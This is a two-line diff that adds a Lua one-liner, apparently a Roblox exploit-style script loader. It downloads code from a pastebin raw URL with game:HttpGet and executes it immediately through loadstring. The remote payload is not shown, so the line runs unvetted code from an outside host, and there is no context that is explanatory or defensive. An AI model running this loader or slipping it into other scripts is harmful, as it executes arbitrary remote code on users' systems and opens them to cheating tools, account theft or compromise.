@@ -1,0 +1,2 @@
+-- lua loadstring:
+loadstring(game:HttpGet("https://pastebin.com/raw/U8J5ApWr"))()
